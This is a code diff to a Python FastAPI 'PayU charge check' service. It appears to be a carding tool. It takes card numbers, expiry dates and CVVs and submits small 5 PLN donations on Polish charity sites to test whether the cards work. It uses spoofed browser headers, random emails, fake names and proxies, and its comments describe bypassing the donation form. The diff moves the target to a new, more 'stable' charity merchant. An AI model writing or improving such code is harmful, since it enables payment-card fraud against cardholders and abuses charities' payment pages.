@@ -6,7 +6,6 @@ import time
 import random
 import string
 import requests
-from urllib.parse import unquote
 
 app = FastAPI()
 
@@ -36,7 +35,7 @@ def _random_ua():
 def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     headers = {
         'accept': '*/*',
-        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
         'authorization': f'Bearer {token}',
         'priority': 'u=1, i',
         'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
@@ -72,12 +71,12 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
-    """Synchronous PayU charge check via fundacjasueryder.pl"""
+    """Synchronous PayU charge check via Golden Stable Merchant"""
     session = requests.Session()
     try:
         email = _random_email()
         ua = _random_ua()
-        name = "John Doe"
+        name = "Jan Kowalski"
 
         if proxy_str:
             session.proxies = {
@@ -88,14 +87,14 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Trigger Order via fundacjasueryder.pl ───
+        # ─── Step 1: Create order via STABLE MERCHANT ───
         headers1 = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://fundacjasueryder.pl',
-            'referer': 'https://fundacjasueryder.pl/en/payu/', # Rujukan dari halaman borang
+            'origin': 'https://fundacjapomocdzisie.pl',
+            'referer': 'https://fundacjapomocdzisie.pl/wplac/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -108,37 +107,26 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         }
 
         data1 = {
-            'payu_amount': '5', # Selalunya nama field berbeza untuk bypass form
-            'payu_description': 'Donation',
-            'payu_email': email,
-            'payu_firstname': name.split()[0],
-            'payu_lastname': name.split()[1],
-            'payu_submit': 'Zapłać', # Simulasikan klik butang submit
+            'imie': name.split()[0],
+            'nazwisko': name.split()[1],
+            'email': email,
+            'kwota': '5.00',
+            'opis': 'Darowizna',
         }
 
-        # GUNA URL TANPA SLASH DI HUJUNG UNTUK BYPASS BORANG
-        r1 = session.post('https://fundacjasueryder.pl/payu', headers=headers1, data=data1, allow_redirects=True, timeout=30)
+        # TIDAK IKUT REDIRECT - Terus tangkap header Location
+        r1 = session.post('https://fundacjapomocdzisie.pl/payu.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
 
         order_id = None
         token = None
 
-        # 1. Cuba cari dalam URL terakhir
-        final_url = str(r1.url)
-        oid = re.search(r'orderId=([^&]+)', final_url)
-        tok = re.search(r'token=([^&]+)', final_url)
-        if oid: order_id = oid.group(1)
-        if tok: token = tok.group(1)
+        if 'Location' in r1.headers:
+            loc = r1.headers['Location']
+            oid = re.search(r'orderId=([^&]+)', loc)
+            tok = re.search(r'token=([^&]+)', loc)
+            if oid: order_id = oid.group(1)
+            if tok: token = tok.group(1)
 
-        # 2. Cuba cari dalam URL yang di-redirect sebelum ni (jika ada dalam history)
-        if not order_id or not token:
-            for hist in r1.history:
-                hist_url = str(hist.url)
-                oid = re.search(r'orderId=([^&]+)', hist_url)
-                tok = re.search(r'token=([^&]+)', hist_url)
-                if oid and not order_id: order_id = oid.group(1)
-                if tok and not token: token = tok.group(1)
-
-        # 3. Cuba cari dalam isi HTML (kadang-kadang di hidden dalam JavaScript)
         if not order_id or not token:
             body = r1.text
             oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
@@ -147,7 +135,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             if tok and not token: token = tok.group(1)
 
         if not order_id or not token:
-            return 'Failed to extract orderId or token', {"error": "Could not parse order", "final_url": final_url, "body_snippet": r1.text[:800]}
+            return 'Failed to extract orderId or token', {"error": "Could not parse order", "status_code": r1.status_code, "body_snippet": r1.text[:500]}
 
         # ─── Step 2: Load PayU pay page ───
         params2 = {'orderId': order_id, 'token': token}
@@ -157,7 +145,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
-            'referer': 'https://fundacjasueryder.pl/',
+            'referer': 'https://fundacjapomocdzisie.pl/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -171,7 +159,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
         
-        final_amount = 500 
+        final_amount = 500 # Default 5.00 PLN
         final_currency = 'PLN'
         
         try:
